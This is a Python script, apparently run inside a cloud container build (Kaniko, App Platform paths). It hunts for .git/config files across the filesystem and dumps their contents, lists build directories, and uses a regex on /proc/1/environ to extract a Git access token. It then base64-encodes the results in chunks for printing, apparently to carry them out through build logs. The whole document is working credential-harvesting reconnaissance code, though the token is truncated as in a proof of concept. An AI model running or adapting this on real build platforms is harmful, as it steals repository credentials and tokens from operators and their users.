import os, json, base64, subprocess

r = {}

# 1. Check .git/config in build context (COPY'd to /src)
for p in ['/src/.git/config', '/workspace/.git/config', '/kaniko/buildcontext/.git/config']:
    try:
        r[p] = open(p).read()[:500]
    except Exception as e:
        r[p] = str(e)[:100]

# 2. Find ALL .git/config files on the system
try:
    found = subprocess.run(['find', '/', '-path', '*/.git/config', '-maxdepth', '8'],
        capture_output=True, text=True, timeout=15).stdout.strip()
    r['all_git_configs'] = found.split('\n') if found else []
    for f in r['all_git_configs']:
        if f:
            try:
                r['content_' + f] = open(f).read()[:500]
            except Exception as e:
                r['err_' + f] = str(e)[:100]
except Exception as e:
    r['find_err'] = str(e)[:200]

# 3. Build context listing
try:
    r['src_ls'] = os.listdir('/src')
except Exception as e:
    r['src_ls'] = str(e)[:100]

try:
    r['src_git_ls'] = os.listdir('/src/.git')
except Exception as e:
    r['src_git_ls'] = str(e)[:100]

# 4. Kaniko workspace
for d in ['/kaniko', '/kaniko/buildcontext', '/.app_platform_workspace']:
    try:
        r['ls_' + d] = os.listdir(d)
    except:
        pass

# 5. Also check /proc/1/environ for comparison
try:
    env = open('/proc/1/environ').read()
    import re
    m = re.search(r'x-access-token:([^@\x00]+)@', env)
    if m:
        r['proc1_token'] = m.group(1)[:12] + '...'
except Exception as e:
    r['proc1_err'] = str(e)[:100]

out = json.dumps(r, indent=2)
d = out.encode()
chunks = [d[i:i+4000] for i in range(0, len(d), 4000)]
for i, c in enumerate(chunks):
    print(f'CHUNK_{i}:' + base64.b64encode(c).decode())
